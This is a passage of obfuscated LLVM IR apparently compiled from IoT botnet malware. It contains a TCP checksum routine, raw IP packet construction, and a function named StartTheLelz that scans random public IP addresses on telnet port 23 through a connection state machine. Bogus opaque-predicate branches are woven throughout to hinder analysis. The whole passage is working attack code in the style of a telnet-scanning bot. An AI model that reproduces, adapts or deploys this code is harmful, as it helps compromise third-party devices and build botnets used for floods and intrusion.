; <label>:87:                                     ; preds = %77
  %88 = load i64, i64* %13, align 8
  %89 = xor i64 %88, -1
  %90 = trunc i64 %89 to i16
  ret i16 %90

originalBBalteredBB:                              ; preds = %originalBB, %2
  %91 = alloca i16*, align 8
  %92 = alloca i32, align 4
  %93 = alloca i64, align 8
  store i16* %0, i16** %91, align 8
  store i32 %1, i32* %92, align 4
  store i64 0, i64* %93, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %22
  %94 = load i32, i32* %12, align 4
  %95 = icmp sgt i32 %94, 1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %50
  %96 = load i32, i32* %12, align 4
  %97 = icmp sgt i32 %96, 0
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #13
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #2
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #2
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %26

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* @x.61
  %9 = load i32, i32* @y.62
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = load i32, i32* %3, align 4
  %17 = call i32 @close(i32 %16)
  store i32 0, i32* %2, align 4
  %18 = load i32, i32* @x.61
  %19 = load i32, i32* @y.62
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %originalBBpart2, %6
  %27 = load i32, i32* @x.61
  %28 = load i32, i32* @y.62
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %26
  %35 = load i32, i32* %2, align 4
  %36 = load i32, i32* @x.61
  %37 = load i32, i32* @y.62
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret i32 %35

originalBBalteredBB:                              ; preds = %originalBB, %7
  %44 = load i32, i32* %3, align 4
  %45 = call i32 @close(i32 %44)
  store i32 0, i32* %2, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %26
  %46 = load i32, i32* %2, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define void @StartTheLelz() #0 {
  %1 = load i32, i32* @x.63
  %2 = load i32, i32* @y.64
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca %struct.__sigset_t, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i8*, align 8
  %18 = alloca %struct.timeval, align 8
  %19 = alloca i8*, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = call i32 @getdtablesize() #2
  %23 = sdiv i32 %22, 4
  %24 = mul nsw i32 %23, 3
  store i32 %24, i32* %9, align 4
  %25 = load i32, i32* %9, align 4
  %26 = icmp sgt i32 %25, 512
  %27 = load i32, i32* @x.63
  %28 = load i32, i32* @y.64
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %26, label %35, label %36

; <label>:35:                                     ; preds = %originalBBpart2
  br label %54

; <label>:36:                                     ; preds = %originalBBpart2
  %37 = load i32, i32* @x.63
  %38 = load i32, i32* @y.64
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %36
  %45 = load i32, i32* %9, align 4
  %46 = load i32, i32* @x.63
  %47 = load i32, i32* @y.64
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart214, label %originalBB12alteredBB

originalBBpart214:                                ; preds = %originalBB12
  br label %54

; <label>:54:                                     ; preds = %originalBBpart214, %35
  %55 = phi i32 [ 512, %35 ], [ %45, %originalBBpart214 ]
  store i32 %55, i32* %9, align 4
  %56 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %56, align 4
  %57 = call zeroext i16 @htons(i16 zeroext 23) #13
  %58 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %57, i16* %58, align 2
  %59 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %60 = getelementptr inbounds [8 x i8], [8 x i8]* %59, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %60, i8 0, i64 8, i32 4, i1 false)
  %61 = load i32, i32* %9, align 4
  %62 = zext i32 %61 to i64
  %63 = call i8* @llvm.stacksave()
  store i8* %63, i8** %17, align 8
  %64 = alloca %struct.telstate_t, i64 %62, align 16
  %65 = bitcast %struct.telstate_t* %64 to i8*
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = mul i64 %67, 5
  call void @llvm.memset.p0i8.i64(i8* %65, i8 0, i64 %68, i32 16, i1 false)
  store i32 0, i32* %10, align 4
  br label %69

; <label>:69:                                     ; preds = %88, %54
  %70 = load i32, i32* %10, align 4
  %71 = load i32, i32* %9, align 4
  %72 = icmp slt i32 %70, %71
  br i1 %72, label %73, label %91

; <label>:73:                                     ; preds = %69
  %74 = load i32, i32* %10, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %75
  %77 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %76, i32 0, i32 3
  store i8 1, i8* %77, align 1
  %78 = call noalias i8* @malloc(i64 1024) #2
  %79 = load i32, i32* %10, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %80
  %82 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %81, i32 0, i32 8
  store i8* %78, i8** %82, align 8
  %83 = load i32, i32* %10, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %84
  %86 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %85, i32 0, i32 8
  %87 = load i8*, i8** %86, align 8
  call void @llvm.memset.p0i8.i64(i8* %87, i8 0, i64 1024, i32 1, i1 false)
  br label %88

; <label>:88:                                     ; preds = %73
  %89 = load i32, i32* %10, align 4
  %90 = add nsw i32 %89, 1
  store i32 %90, i32* %10, align 4
  br label %69

; <label>:91:                                     ; preds = %69
  %92 = getelementptr inbounds %struct.timeval, %struct.timeval* %18, i32 0, i32 0
  store i64 5, i64* %92, align 8
  %93 = getelementptr inbounds %struct.timeval, %struct.timeval* %18, i32 0, i32 1
  store i64 0, i64* %93, align 8
  br label %94

; <label>:94:                                     ; preds = %1530, %91
  br label %95

; <label>:95:                                     ; preds = %94
  store i32 0, i32* %10, align 4
  br label %96

; <label>:96:                                     ; preds = %1527, %95
  %97 = load i32, i32* @x.63
  %98 = load i32, i32* @y.64
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %96
  %105 = load i32, i32* %10, align 4
  %106 = load i32, i32* %9, align 4
  %107 = icmp slt i32 %105, %106
  %108 = load i32, i32* @x.63
  %109 = load i32, i32* @y.64
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  br i1 %107, label %116, label %1530

; <label>:116:                                    ; preds = %originalBBpart218
  %117 = load i32, i32* @x.63
  %118 = load i32, i32* @y.64
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %116
  %125 = load i32, i32* %10, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %126
  %128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %127, i32 0, i32 2
  %129 = load i8, i8* %128, align 8
  %130 = zext i8 %129 to i32
  %131 = load i32, i32* @x.63
  %132 = load i32, i32* @y.64
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBBpart222, label %originalBB20alteredBB

originalBBpart222:                                ; preds = %originalBB20
  switch i32 %130, label %1526 [
    i32 0, label %139
    i32 1, label %312
    i32 2, label %548
    i32 3, label %788
    i32 4, label %888
    i32 5, label %1089
    i32 6, label %1173
    i32 7, label %1397
    i32 8, label %1425
  ]

; <label>:139:                                    ; preds = %originalBBpart222
  %140 = load i32, i32* %10, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %141
  %143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %142, i32 0, i32 8
  %144 = load i8*, i8** %143, align 8
  call void @llvm.memset.p0i8.i64(i8* %144, i8 0, i64 1024, i32 1, i1 false)
  %145 = load i32, i32* %10, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %146
  %148 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %147, i32 0, i32 3
  %149 = load i8, i8* %148, align 1
  %150 = icmp ne i8 %149, 0
  br i1 %150, label %151, label %171

; <label>:151:                                    ; preds = %139
  %152 = load i32, i32* %10, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %153
  %155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %154, i32 0, i32 8
  %156 = load i8*, i8** %155, align 8
  store i8* %156, i8** %19, align 8
  %157 = load i32, i32* %10, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %158
  %160 = bitcast %struct.telstate_t* %159 to i8*
  call void @llvm.memset.p0i8.i64(i8* %160, i8 0, i64 32, i32 16, i1 false)
  %161 = load i8*, i8** %19, align 8
  %162 = load i32, i32* %10, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %163
  %165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %164, i32 0, i32 8
  store i8* %161, i8** %165, align 8
  %166 = call i32 @getRandomPublicIP()
  %167 = load i32, i32* %10, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %168
  %170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %169, i32 0, i32 1
  store i32 %166, i32* %170, align 4
  br label %226

; <label>:171:                                    ; preds = %139
  %172 = load i32, i32* %10, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %173
  %175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %174, i32 0, i32 5
  %176 = load i8, i8* %175, align 1
  %177 = add i8 %176, 1
  store i8 %177, i8* %175, align 1
  %178 = load i32, i32* %10, align 4
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %179
  %181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %180, i32 0, i32 5
  %182 = load i8, i8* %181, align 1
  %183 = zext i8 %182 to i64
  %184 = icmp eq i64 %183, 14
  br i1 %184, label %185, label %196

; <label>:185:                                    ; preds = %171
  %186 = load i32, i32* %10, align 4
  %187 = sext i32 %186 to i64
  %188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %187
  %189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %188, i32 0, i32 5
  store i8 0, i8* %189, align 1
  %190 = load i32, i32* %10, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %191
  %193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %192, i32 0, i32 4
  %194 = load i8, i8* %193, align 2
  %195 = add i8 %194, 1
  store i8 %195, i8* %193, align 2
  br label %196

; <label>:196:                                    ; preds = %185, %171
  %197 = load i32, i32* %10, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %198
  %200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %199, i32 0, i32 4
  %201 = load i8, i8* %200, align 2
  %202 = zext i8 %201 to i64
  %203 = icmp eq i64 %202, 6
  br i1 %203, label %204, label %209

; <label>:204:                                    ; preds = %196
  %205 = load i32, i32* %10, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %206
  %208 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %207, i32 0, i32 3
  store i8 1, i8* %208, align 1
  br label %1527

; <label>:209:                                    ; preds = %196
  %210 = load i32, i32* @x.63
  %211 = load i32, i32* @y.64
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %209
  %218 = load i32, i32* @x.63
  %219 = load i32, i32* @y.64
  %220 = sub i32 %218, 1
  %221 = mul i32 %218, %220
  %222 = urem i32 %221, 2
  %223 = icmp eq i32 %222, 0
  %224 = icmp slt i32 %219, 10
  %225 = or i1 %223, %224
  br i1 %225, label %originalBBpart226, label %originalBB24alteredBB

originalBBpart226:                                ; preds = %originalBB24
  br label %226

; <label>:226:                                    ; preds = %originalBBpart226, %151
  %227 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %227, align 4
  %228 = call zeroext i16 @htons(i16 zeroext 23) #13
  %229 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %228, i16* %229, align 2
  %230 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %231 = getelementptr inbounds [8 x i8], [8 x i8]* %230, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %231, i8 0, i64 8, i32 4, i1 false)
  %232 = load i32, i32* %10, align 4
  %233 = sext i32 %232 to i64
  %234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %233
  %235 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %234, i32 0, i32 1
  %236 = load i32, i32* %235, align 4
  %237 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %238 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %237, i32 0, i32 0
  store i32 %236, i32* %238, align 4
  %239 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %240 = load i32, i32* %10, align 4
  %241 = sext i32 %240 to i64
  %242 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %241
  %243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %242, i32 0, i32 0
  store i32 %239, i32* %243, align 16
  %244 = load i32, i32* %10, align 4
  %245 = sext i32 %244 to i64
  %246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %245
  %247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %246, i32 0, i32 0
  %248 = load i32, i32* %247, align 16
  %249 = bitcast %struct.timeval* %18 to i8*
  %250 = call i32 @setsockopt(i32 %248, i32 1, i32 20, i8* %249, i32 16) #2
  %251 = load i32, i32* %10, align 4
  %252 = sext i32 %251 to i64
  %253 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %252
  %254 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %253, i32 0, i32 0
  %255 = load i32, i32* %254, align 16
  %256 = bitcast %struct.timeval* %18 to i8*
  %257 = call i32 @setsockopt(i32 %255, i32 1, i32 21, i8* %256, i32 16) #2
  %258 = load i32, i32* %10, align 4
  %259 = sext i32 %258 to i64
  %260 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %259
  %261 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %260, i32 0, i32 0
  %262 = load i32, i32* %261, align 16
  %263 = icmp eq i32 %262, -1
  br i1 %263, label %264, label %265

; <label>:264:                                    ; preds = %226
  br label %1527

; <label>:265:                                    ; preds = %226
  %266 = load i32, i32* %10, align 4
  %267 = sext i32 %266 to i64
  %268 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %267
  %269 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %268, i32 0, i32 0
  %270 = load i32, i32* %269, align 16
  %271 = load i32, i32* %10, align 4
  %272 = sext i32 %271 to i64
  %273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %272
  %274 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %273, i32 0, i32 0
  %275 = load i32, i32* %274, align 16
  %276 = call i32 (i32, i32, ...) @fcntl(i32 %275, i32 3, i8* null)
  %277 = or i32 %276, 2048
  %278 = call i32 (i32, i32, ...) @fcntl(i32 %270, i32 4, i32 %277)
  %279 = load i32, i32* %10, align 4
  %280 = sext i32 %279 to i64
  %281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %280
  %282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %281, i32 0, i32 0
  %283 = load i32, i32* %282, align 16
  %284 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %285 = call i32 @connect(i32 %283, %struct.sockaddr* %284, i32 16)
  %286 = icmp eq i32 %285, -1
  br i1 %286, label %287, label %302

; <label>:287:                                    ; preds = %265
  %288 = call i32* @__errno_location() #13
  %289 = load i32, i32* %288, align 4
  %290 = icmp ne i32 %289, 115
  br i1 %290, label %291, label %302

; <label>:291:                                    ; preds = %287
  %292 = load i32, i32* %10, align 4
  %293 = sext i32 %292 to i64
  %294 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %293
  %295 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %294, i32 0, i32 0
  %296 = load i32, i32* %295, align 16
  %297 = call i32 @sclose(i32 %296)
  %298 = load i32, i32* %10, align 4
  %299 = sext i32 %298 to i64
  %300 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %299
  %301 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %300, i32 0, i32 3
  store i8 1, i8* %301, align 1
  br label %311

; <label>:302:                                    ; preds = %287, %265
  %303 = load i32, i32* %10, align 4
  %304 = sext i32 %303 to i64
  %305 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %304
  %306 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %305, i32 0, i32 2
  store i8 1, i8* %306, align 8
  %307 = load i32, i32* %10, align 4
  %308 = sext i32 %307 to i64
  %309 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %308
  %310 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %309, i32 0, i32 6
  store i32 0, i32* %310, align 4
  br label %311

; <label>:311:                                    ; preds = %302, %291
  br label %1526

; <label>:312:                                    ; preds = %originalBBpart222
  %313 = load i32, i32* %10, align 4
  %314 = sext i32 %313 to i64
  %315 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %314
  %316 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %315, i32 0, i32 6
  %317 = load i32, i32* %316, align 4
  %318 = icmp eq i32 %317, 0
  br i1 %318, label %319, label %325

; <label>:319:                                    ; preds = %312
  %320 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %321 = load i32, i32* %10, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %322
  %324 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %323, i32 0, i32 6
  store i32 %320, i32* %324, align 4
  br label %325

; <label>:325:                                    ; preds = %319, %312
  %326 = load i32, i32* @x.63
  %327 = load i32, i32* @y.64
  %328 = sub i32 %326, 1
  %329 = mul i32 %326, %328
  %330 = urem i32 %329, 2
  %331 = icmp eq i32 %330, 0
  %332 = icmp slt i32 %327, 10
  %333 = or i1 %331, %332
  br i1 %333, label %originalBB28, label %originalBB28alteredBB

originalBB28:                                     ; preds = %originalBB28alteredBB, %325
  %334 = load i32, i32* @x.63
  %335 = load i32, i32* @y.64
  %336 = sub i32 %334, 1
  %337 = mul i32 %334, %336
  %338 = urem i32 %337, 2
  %339 = icmp eq i32 %338, 0
  %340 = icmp slt i32 %335, 10
  %341 = or i1 %339, %340
  br i1 %341, label %originalBBpart230, label %originalBB28alteredBB

originalBBpart230:                                ; preds = %originalBB28
  br label %342

; <label>:342:                                    ; preds = %originalBBpart230
